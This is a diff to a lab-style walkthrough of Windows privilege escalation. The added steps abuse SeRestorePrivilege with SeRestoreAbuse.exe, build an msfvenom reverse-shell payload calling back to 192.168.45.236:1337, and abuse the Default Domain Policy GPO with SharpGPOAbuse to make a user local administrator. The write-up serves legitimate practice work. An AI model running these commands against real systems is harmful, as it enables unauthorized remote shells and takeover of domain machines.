@@ -260,10 +260,68 @@ net localgroup 'Remote Management Users'
 
 All clear, only Anirudh has remote access.
 
-Lets go with winpeas:
+So lets try remote access
+Download https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe :
+
 ```bash
-cp /usr/share/peass/winpeas/winPEASany.exe winpeasany.exe
+SeRestoreAbuse.exe
+xct - Abuse SeRestorePriviledge - SeRestoreAbuse
+SeRestoreAbuse.exe "cmd /c ..."
+SeRestoreAbuse.exe "cmd /c C:\temp\rshell.exe"
+```
+SeRestore abuse will use our revshell to boost our priv.
+Our rev shell:
+
+```bash
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.236 LPORT=1337 -f exe -o rev.exe 
 ```
 
-![alt text](image-10.png)
+Now use it:
+*Evil-WinRM* PS C:\Users\anirudh\Documents> .\SeRestoreAbuse.exe C:\Users\anirudh\Documents\rev.exe
 
+![alt text](image-12.png)
+
+We git it!
+
+![alt text](image-13.png)
+
+Alternative option (Powerview.ps1):
+
+```bash
+*Evil-WinRM* PS C:\Users\anirudh\Documents> .\powerview.ps1
+*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPO -Name "Default Domain Policy"
+```
+
+![alt text](image-14.png)
+
+copy ID: 31b2f340-016d-11d2-945f-00c04fb984f9
+
+```bash
+Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh
+```
+
+![alt text](image-15.png)
+
+So we will abuse GPO (Absolute power!)
+Download: https://github.com/byronkg/SharpGPOAbuse
+Run:
+```bash
+ .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+```
+
+![alt text](image-16.png)
+
+Force policy update:
+```bash
+gpupdate /force
+```
+
+![alt text](image-17.png)
+
+check:
+```bash
+ net localgroup administrators
+```
+![alt text](image-18.png)
+
+And we are there!
